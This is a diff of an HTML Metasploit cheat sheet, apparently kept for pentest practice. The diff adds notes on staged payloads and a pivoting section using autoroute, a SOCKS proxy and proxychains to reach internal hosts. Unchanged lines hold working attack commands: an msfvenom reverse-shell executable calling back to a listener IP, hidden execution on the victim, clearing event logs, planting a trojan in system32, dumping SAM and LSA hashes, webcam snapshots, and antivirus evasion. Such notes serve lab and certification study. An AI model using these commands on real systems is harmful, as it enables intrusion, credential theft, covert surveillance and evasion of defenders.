@@ -31,6 +31,17 @@
                     <p>Use the following plugin</p>
                     <pre><code class="language-bash">exploit/multi/handler</code></pre>
                     <p>Configure it using the same payload that you used to created in msfvenom</p>
+
+                    <h3>Difference in payloads</h3>
+                    <ul>
+                    <p>Have in mind that there are two kind of payloads. Staged and Non-Staged. Staged payloads are smaller in size but require more steps to execute, while Non-Staged payloads are larger but can be executed directly.</p>
+                    <p>In order to differentiate them just take a look if the last part of the name contains a "/"  here goes an example</p>
+                    <p><b>Staged</b>: windows/x64/shell/reverse_tcp</p>
+                    <p><b>on-Staged</b>: windows/x64/shell_reverse_tcp</p>
+                    
+                    <p><b>In case we are trying to capture a shell using nc and we have previusly used an staged payload i won't work</b></p>
+                    </ul>
+
             </ul>
 
             <h2>Modifying payloads from exploits</h2>
@@ -65,7 +76,7 @@ shellcode += b"\x5e\x33\xc9\xb1\x52\x83\xee\xfc\x31\x56\x0e"</code></pre>
                 <pre><code class="language-bash">shell</code></pre>
                 <pre><code class="language-bash">background</code></pre>
                 
-                <h2>Exploit suggester </h2>
+                <h3>Exploit suggester </h3>
                 <ul>
                     <p>After any exploit suggestion at least try the following to escalate privileges</p>
                     <pre><code class="language-bash">meterpreter > getsystem</code></pre>
@@ -74,7 +85,7 @@ shellcode += b"\x5e\x33\xc9\xb1\x52\x83\xee\xfc\x31\x56\x0e"</code></pre>
                     <pre><code class="language-bash">meterpreter > run post/multi/recon/local_exploit_suggester</code></pre>
                 </ul>
 
-                <h2>Migrate shell</h2>
+                <h3>Migrate shell</h3>
                 <ul>
                     <p>Using the migrate post module, you can migrate to another process on the victim.</p>
                     <pre><code class="language-bash">meterpreter > run post/windows/manage/migrate</code></pre>
@@ -87,7 +98,7 @@ shellcode += b"\x5e\x33\xc9\xb1\x52\x83\xee\xfc\x31\x56\x0e"</code></pre>
                     <p>Now attempt again</p>
                 </ul>
 
-                <h2>Duplicate Session</h2>
+                <h3>Duplicate Session</h3>
                 <ul>
                 <p> Generate a malicious .exe file using msfvenom</p>
                 <pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.17 LPORT=4444 -f exe -o /tmp/shell.exe</code></pre>
@@ -99,42 +110,65 @@ meterpreter > execute -f C:\\Windows\\Temp\\shell.exe -H</code></pre>
 exploit exploit -j -z</code></pre>
                 </ul>
 
-                <h2>Clear logs</h2>
+                <h3>Clear logs</h3>
                 <ul>
                 <p>From meterpreter type the following command to clear logs</p>
                 <pre><code class="language-bash">meterpreter > clearev</code></pre>
                 </ul>
                 
-                <h2>Dowload & upload</h2>
+                <h3>Dowload & upload</h3>
                 <ul>
                 <pre><code class="language-bash">meterpreter > download c:\\boot.ini</code></pre>
                 <pre><code class="language-bash">meterpreter > upload evil_trojan.exe c:\\windows\\system32</code></pre>
                 </ul>
 
-                <h2>Dump hashes</h2>
+                <h3>Dump hashes</h3>
                 <ul>
                 <p>The hashdump post module will dump the contents of the SAM database.</p>
                 <pre><code class="language-bash">meterpreter > run post/windows/gather/hashdump</code></pre>
                 <p>In case you would like lsass.dmp you could always import kiwi module from mimikatz. It's worth looking at help since there are some additional commands which may come handy in case lsass don't give you anythin useful</p>
                 <pre><code class="language-bash">meterpreter > load kiwi
 meterpreter > lsa_dump_sam</code></pre> 
-                
-                
                 </ul>
 
-                <h2>Webcam list</h2>
+                <h3>Webcam list</h3>
                 <ul>
                 <p>The webcam_list command when run from the Meterpreter shell, will display currently available web cams on the target host.</p>
                 <pre><code class="language-bash">meterpreter > webcam_list</code></pre>
                 </ul>
 
-                <h2>Webcam Snap</h2>
+                <h3>Webcam Snap</h3>
                 <ul>
                 <p>The webcam_list command when run from the Meterpreter shell, will display currently available web cams on the target host.</p>
                 <pre><code class="language-bash">meterpreter > webcam_snap -h</code></pre>
                 </ul>
 
             </ul>
+
+            <h2>Pivoting using metasploit</h2>
+            <ul>
+                <p>Once you have gained ROOT/SYSTEM privileges in a box you could be able to pivot to other systems on the network.</p>
+                <p>To do so first check the IP range by looking at the ifconfig of the target box and setup a rule like this in the metasploit console</p>
+                <pre><code class="language-bash">route add 172.16.210.0/24 1   #route add IP_RANGE NETMASK GATEWAY</code></pre>
+                <p>Alternatively you can also use the module <b>multi/manage/autoroute</b></p>
+                <p>Now that you have connectivity just take another module and attempt to attack the box as normally obviously setting the new IP address. You could start by using this module to scan open ports <b>auxiliary/scanner/portscan/tcp</b> </p>
+                <p>Also what you could do is use SOCKS to allow applications outside matasploit to run though the tunnel you just created. Use the following module <b>auxiliary/server/socks_proxy</b></p>
+                <p>Configure the following</p>
+                <pre><code class="language-bash">msf auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
+SRVHOST => 127.0.0.1
+msf auxiliary(server/socks_proxy) > set version 5
+version => 5
+msf auxiliary(server/socks_proxy) > run</code></pre>
+                <p>Edit proxychains file and setup your local ip address 127.0.0.1 and the SOCKS5 port (1080)</p>
+                <pre><code class="language-bash">127.0.0.1 1080</code></pre>
+                <p>Finally juyst use proxychains to query the internal hosts</p>  
+                <pre><code class="language-bash">proxychains xfreerdp /v:172.16.210.200 /u:luiza</code></pre>
+                
+
+                
+            </ul>
+
+
             <h2>Encoding malicious files</h2>
             <ul>
                 <p>Some times we generated a malicious .exe, .dll... file and we wan't to be detected by the AV. So we can ecodeit to make it harder for the victim to detect it</p>
